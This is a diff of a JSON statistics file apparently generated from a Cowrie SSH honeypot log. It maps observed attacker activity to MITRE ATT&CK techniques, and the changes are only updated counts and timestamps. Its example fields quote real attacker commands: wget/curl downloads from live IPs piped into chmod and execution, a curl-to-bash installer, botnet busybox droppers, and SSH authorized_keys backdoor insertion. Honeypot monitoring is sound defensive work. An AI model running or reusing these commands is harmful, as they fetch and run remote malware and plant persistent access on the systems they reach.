@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-04 16:02:36",
+  "generated": "2026-10-04 17:04:32",
   "totals": {
-    "commands": 222051,
-    "login_failed": 352342,
-    "login_success": 57003,
-    "sessions": 366866
+    "commands": 222078,
+    "login_failed": 352989,
+    "login_success": 57010,
+    "sessions": 367539
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 352342,
+      "count": 352989,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-04T16:02:35.553487Z",
-      "unique_ips": 5723
+      "last": "2026-10-04T17:03:50.359492Z",
+      "unique_ips": 5725
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 57003,
+      "count": 57010,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,14 +37,14 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-04T15:53:37.857781Z",
-      "unique_ips": 4580
+      "last": "2026-10-04T16:55:04.853684Z",
+      "unique_ips": 4582
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 18572,
+      "count": 18574,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-10-04T14:49:51.049974Z",
-      "unique_ips": 1487
+      "last": "2026-10-04T16:55:06.356269Z",
+      "unique_ips": 1488
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 18024,
+      "count": 18025,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-04T14:49:58.099092Z",
-      "unique_ips": 660
+      "last": "2026-10-04T16:55:14.385840Z",
+      "unique_ips": 661
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 6785,
+      "count": 6786,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,14 +85,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-04T15:40:38.832815Z",
-      "unique_ips": 1359
+      "last": "2026-10-04T16:55:06.520299Z",
+      "unique_ips": 1360
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6445,
+      "count": 6455,
       "examples": [
         "uname -s -v -n -r -m",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -101,14 +101,14 @@
         "uname -s -m"
       ],
       "first": "2026-08-11T00:27:16.369209Z",
-      "last": "2026-10-04T15:36:06.450297Z",
-      "unique_ips": 1085
+      "last": "2026-10-04T16:55:22.360233Z",
+      "unique_ips": 1086
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 1878,
+      "count": 1880,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -117,14 +117,14 @@
         "uname -a;w"
       ],
       "first": "2026-08-11T00:53:13.060148Z",
-      "last": "2026-10-04T13:45:35.665247Z",
-      "unique_ips": 1051
+      "last": "2026-10-04T16:55:20.775312Z",
+      "unique_ips": 1052
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 1456,
+      "count": 1458,
       "examples": [
         "/bin/busybox ps; /bin/busybox ECCHI",
         "ps | grep '[Mm]iner'",
@@ -133,22 +133,22 @@
         "/bin/busybox ps; /bin/busybox Taro"
       ],
       "first": "2026-08-11T00:40:36.300925Z",
-      "last": "2026-10-04T14:49:56.192056Z",
-      "unique_ips": 619
+      "last": "2026-10-04T16:55:18.383050Z",
+      "unique_ips": 620
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 678,
+      "count": 679,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-08-11T01:37:12.477623Z",
-      "last": "2026-10-04T13:44:36.464459Z",
-      "unique_ips": 601
+      "last": "2026-10-04T16:55:06.356269Z",
+      "unique_ips": 602
     },
     {
       "id": "T1489",
@@ -323,15 +323,15 @@
   "unmapped": [
     [
       "sh",
-      51422
+      51424
     ],
     [
       "system",
-      50944
+      50946
     ],
     [
       "shell",
-      34211
+      34213
     ],
     [
       "/bin/busybox",
@@ -339,7 +339,7 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      2855
+      2857
     ],
     [
       "enable",
@@ -404,10 +404,10 @@
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "logins": 10729,
-    "sessions": 10343,
-    "commands": 3933,
-    "downloads": 42,
-    "unique_ips": 292
+    "sessions": 10312,
+    "logins": 10685,
+    "commands": 3881,
+    "downloads": 43,
+    "unique_ips": 299
   }
 }
